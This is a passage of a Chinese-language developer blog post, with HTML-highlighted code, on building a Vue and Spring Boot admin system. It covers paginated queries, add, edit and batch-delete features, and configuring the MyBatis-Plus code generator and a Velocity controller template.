punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">http://localhost:9090/user/page?pageNum=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pageNum<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">&amp;pageSize=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pageSize<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">&amp;username=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>username<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">res</span> <span class=\"token operator\">=></span> res<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">res</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>tableData <span class=\"token operator\">=</span> res<span class=\"token punctuation\">.</span>data</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>total <span class=\"token operator\">=</span> res<span class=\"token punctuation\">.</span>total</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr></table></figure><p>成功请求后，多添加参数，在后端 controller 利用框架实现模糊查询</p>\n<h2 id=\"新增功能-2\"><a class=\"anchor\" href=\"#新增功能-2\">#</a> 新增功能</h2>\n<p>前端添加 dialog 对话框，动态绑定多个参数，dialogFormVisible 设置 false 不可视，与新增按钮绑定，点击新增按钮时，就变为 true，显示</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240118092823355.png\" alt=\"image-20240118092823355\" /></p>\n<p>再设计出前端向后端发送 post 请求保存数据，这里添加新字段后对应的 id 自增的非常大，注解 @TableID 需要设置 type = IdType.AUTO</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240118093526655.png\" alt=\"image-20240118093526655\" /></p>\n<p>数据库设置自增为 1，这里<strong>解决了问题 13</strong></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240118095104899.png\" alt=\"image-20240118095104899\" /></p>\n<p>后端 controller 设置倒序</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240118103551094.png\" alt=\"image-20240118103551094\" /></p>\n<h2 id=\"编辑功能\"><a class=\"anchor\" href=\"#编辑功能\">#</a> 编辑功能</h2>\n<p>同样，给 el-button 加个 @click 触发器，这里<strong>解决了问题 14</strong></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240118115101197.png\" alt=\"image-20240118115101197\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240118115217399.png\" alt=\"image-20240118115217399\" /></p>\n<h2 id=\"删除功能-2\"><a class=\"anchor\" href=\"#删除功能-2\">#</a> 删除功能</h2>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240118130933924.png\" alt=\"image-20240118130933924\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240118132301716.png\" alt=\"image-20240118132301716\" /></p>\n<pre><code class=\"language-vue\">&lt;el-popconfirm\n    class=&quot;ml-5&quot;\n    confirm-button-text='OK'\n    cancel-button-text='Not'\n    icon=&quot;el-icon-info&quot;\n    icon-color=&quot;red&quot;\n    title=&quot;Sure？&quot;\n    @confirm=&quot;handleDel(scope.row.id)&quot;\n&gt;\n  &lt;el-button type=&quot;danger&quot; slot=&quot;reference&quot;&gt;删除&lt;i class=&quot;el-icon-scissors&quot;&gt;&lt;/i&gt;&lt;/el-button&gt;\n&lt;/el-popconfirm&gt;\n</code></pre>\n<p>继而实现了批量删除的功能，后端调用 mp 框架 userService.removeByIds</p>\n<p><strong>解决了问题 15</strong></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240118152149271.png\" alt=\"image-20240118152149271\" /></p>\n<p>成功批量删除</p>\n<h1 id=\"springboot代码生成器\"><a class=\"anchor\" href=\"#springboot代码生成器\">#</a> Springboot 代码生成器</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hxbm9kZS9hcnRpY2xlL2RldGFpbHMvMTIyNzA0NTQw\">https://blog.csdn.net/xqnode/article/details/122704540</span></p>\n<p>加入依赖</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!--mybatis-plus 代码生成器 --></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>com.baomidou<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>mybatis-plus-generator<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>3.5.5<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>更新 maven 依赖</p>\n<p>还需要引入 Velocity 的依赖</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tdm5yZXBvc2l0b3J5LmNvbS9hcnRpZmFjdC9vcmcuYXBhY2hlLnZlbG9jaXR5\">https://mvnrepository.com/artifact/org.apache.velocity</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tdm5yZXBvc2l0b3J5LmNvbS9hcnRpZmFjdC9vcmcuYXBhY2hlLnZlbG9jaXR5L3ZlbG9jaXR5\">https://mvnrepository.com/artifact/org.apache.velocity/velocity</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tdm5yZXBvc2l0b3J5LmNvbS9hcnRpZmFjdC9vcmcuYXBhY2hlLnZlbG9jaXR5L3ZlbG9jaXR5LzEuNw==\">https://mvnrepository.com/artifact/org.apache.velocity/velocity/1.7</span></p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!-- https://mvnrepository.com/artifact/org.apache.velocity/velocity --></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>org.apache.velocity<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>velocity<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>1.7<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>新建类 com.xoxbc.springboot.<strong>utils/CodeGenerator.java</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYW9taWRvdS5jb20vcGFnZXMvNzc5YTZlLyMlRTQlQkQlQkYlRTclOTQlQTg=\">https://baomidou.com/pages/779a6e/# 使用</span><strong>导包</strong></p>\n<p><strong>解决错误 16</strong>，已在下面 java 代码中修改</p>\n<h2 id=\"codegeneratorjava\"><a class=\"anchor\" href=\"#codegeneratorjava\">#</a> CodeGenerator.java</h2>\n<p>所有解决完报错需要导入的依赖见<strong>问题 17</strong></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot<span class=\"token punctuation\">.</span>utils</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>baomidou<span class=\"token punctuation\">.</span>mybatisplus<span class=\"token punctuation\">.</span>generator<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">FastAutoGenerator</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>baomidou<span class=\"token punctuation\">.</span>mybatisplus<span class=\"token punctuation\">.</span>generator<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">OutputFile</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>baomidou<span class=\"token punctuation\">.</span>mybatisplus<span class=\"token punctuation\">.</span>generator<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">.</span>rules<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">DbColumnType</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>baomidou<span class=\"token punctuation\">.</span>mybatisplus<span class=\"token punctuation\">.</span>generator<span class=\"token punctuation\">.</span>engine<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">FreemarkerTemplateEngine</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>sql<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Types</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Collections</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">CodeGenerator</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token comment\">// String projectPath = System.getProperty (\"user.dir\");//user.dir\t用户当前工作目录</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token class-name\">FastAutoGenerator</span><span class=\"token punctuation\">.</span><span class=\"token function\">create</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"jdbc:mysql://localhost:3306/xh1xxhg?serverTimezone=GMT%2b8\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"root\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"root\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">.</span><span class=\"token function\">globalConfig</span><span class=\"token punctuation\">(</span>builder <span class=\"token operator\">-></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\t\t\tbuilder<span class=\"token punctuation\">.</span><span class=\"token function\">author</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Xh1Xxhg\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 设置作者</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\t\t\t\t\t<span class=\"token punctuation\">.</span><span class=\"token function\">enableSwagger</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 开启 swagger 模式</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t\t\t\t\t\t<span class=\"token punctuation\">.</span><span class=\"token function\">enableSpringdoc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 开启 SpringDoc 模式</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t\t\t\t\t\t<span class=\"token punctuation\">.</span><span class=\"token function\">outputDir</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"D:\\\\Project_workspace\\\\BackManaSys\\\\springboot\\\\src\\\\main\\\\java\\\\\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 指定输出目录</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">.</span><span class=\"token function\">dataSourceConfig</span><span class=\"token punctuation\">(</span>builder <span class=\"token operator\">-></span> builder<span class=\"token punctuation\">.</span><span class=\"token function\">typeConvertHandler</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>globalConfig<span class=\"token punctuation\">,</span> typeRegistry<span class=\"token punctuation\">,</span> metaInfo<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">int</span> typeCode <span class=\"token operator\">=</span> metaInfo<span class=\"token punctuation\">.</span><span class=\"token function\">getJdbcType</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token constant\">TYPE_CODE</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>typeCode <span class=\"token operator\">==</span> <span class=\"token class-name\">Types</span><span class=\"token punctuation\">.</span><span class=\"token constant\">SMALLINT</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t\t\t\t\t<span class=\"token comment\">// 自定义类型转换</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">return</span> <span class=\"token class-name\">DbColumnType</span><span class=\"token punctuation\">.</span><span class=\"token constant\">INTEGER</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">return</span> typeRegistry<span class=\"token punctuation\">.</span><span class=\"token function\">getColumnType</span><span class=\"token punctuation\">(</span>metaInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">.</span><span class=\"token function\">packageConfig</span><span class=\"token punctuation\">(</span>builder <span class=\"token operator\">-></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t\t\t\tbuilder<span class=\"token punctuation\">.</span><span class=\"token function\">parent</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.xoxbc.springboot\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 设置父包名</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t\t\t\t\t\t<span class=\"token punctuation\">.</span><span class=\"token function\">moduleName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 设置父包模块名</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t\t\t\t\t\t<span class=\"token comment\">// 对应 com.example.module_name</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t\t\t\t\t\t<span class=\"token punctuation\">.</span><span class=\"token function\">pathInfo</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Collections</span><span class=\"token punctuation\">.</span><span class=\"token function\">singletonMap</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">OutputFile</span><span class=\"token punctuation\">.</span>xml<span class=\"token punctuation\">,</span> <span class=\"token string\">\"D:\\\\Project_workspace\\\\BackManaSys\\\\springboot\\\\src\\\\main\\\\resources\\\\mapper\\\\\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 设置 mapperXml 生成路径</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">.</span><span class=\"token function\">strategyConfig</span><span class=\"token punctuation\">(</span>builder <span class=\"token operator\">-></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t\t\t\tbuilder<span class=\"token punctuation\">.</span><span class=\"token function\">addInclude</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sys_user\"</span><span class=\"token punctuation\">)</span><span class=\"token comment\">// 设置需要生成的表名</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t\t\t\t\t\t<span class=\"token punctuation\">.</span><span class=\"token function\">addTablePrefix</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"t_\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"sys_\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">//// 设置过滤表前缀</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t\t\t\t\t\t<span class=\"token punctuation\">.</span><span class=\"token function\">entityBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">enableLombok</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">enableFileOverride</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">//entity 包开启 lombok 和覆盖</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                            <span class=\"token punctuation\">.</span><span class=\"token function\">controllerBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">enableFileOverride</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">enableRestStyle</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">//controller 包开启覆盖 开启 RestController 模式</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t\t\t\t\t\t<span class=\"token punctuation\">.</span><span class=\"token function\">mapperBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">enableFileOverride</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">//mapper 包开启覆盖</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t\t\t\t\t\t<span class=\"token punctuation\">.</span><span class=\"token function\">serviceBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">enableFileOverride</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//service 包开启覆盖</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\t\t\t<span class=\"token comment\">// 使用自定义模板要注释下面一行</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t\t\t<span class=\"token comment\">//.templateEngine (new FreemarkerTemplateEngine ()) // 使用 Freemarker 引擎模板，默认的是 Velocity 引擎模板</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>接下来直接右键运行就可以生成，把之前的 java 各个层代码备份一下</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240118161321918.png\" alt=\"image-20240118161321918\" /></p>\n<p>这里解决了<strong>错误 17</strong>，运行后生成的代码目录</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240118163944128.png\" alt=\"image-20240118163944128\" /></p>\n<p><strong>本人这里没配置 swagger，与预期结果不一样，需要用到之前备份的源码替换回去</strong></p>\n<p>配置好 swagger，实体类里的 @Schema () 注解不会报错</p>\n<h2 id=\"controllerjavavm\"><a class=\"anchor\" href=\"#controllerjavavm\">#</a> controller.java.vm</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYWxhbmQtMTQxNS9wLzEyOTc5NDQwLmh0bWw=\">https://www.cnblogs.com/aland-1415/p/12979440.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NTQxNDkwOC9hcnRpY2xlL2RldGFpbHMvMTI4ODIzNDY1\">https://blog.csdn.net/weixin_55414908/article/details/128823465</span></p>\n<p>这里<strong>自动生成 controller 代码模板</strong>也需要配置好（使用自定义模板需要把之前 <code>.templateEngine(new FreemarkerTemplateEngine()</code>  给注释掉）</p>\n<p>注意目录，在<strong> resources 下的 templats 文件夹下创建 controller.java.vm 文件</strong></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240118194217004.png\" alt=\"image-20240118194217004\" /></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> $<span class=\"token punctuation\">&#123;</span><span class=\"token class-name\"><span class=\"token namespace\">package<span class=\"token punctuation\">.</span></span>Controller</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>baomidou<span class=\"token punctuation\">.</span>mybatisplus<span class=\"token punctuation\">.</span>extension<span class=\"token punctuation\">.</span>plugins<span class=\"token punctuation\">.</span>pagination<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Page</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Resource</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">List</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>baomidou<span class=\"token punctuation\">.</span>mybatisplus<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">.</span>conditions<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">QueryWrapper</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> $<span class=\"token punctuation\">&#123;</span><span class=\"token class-name\"><span class=\"token namespace\">package<span class=\"token punctuation\">.</span></span>Service</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">.</span>$<span class=\"token punctuation\">&#123;</span>table<span class=\"token punctuation\">.</span>serviceName<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> $<span class=\"token punctuation\">&#123;</span><span class=\"token class-name\"><span class=\"token namespace\">package<span class=\"token punctuation\">.</span></span>Entity</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">.</span>$<span class=\"token punctuation\">&#123;</span>entity<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>#<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>$<span class=\"token punctuation\">&#123;</span>restControllerStyle<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token 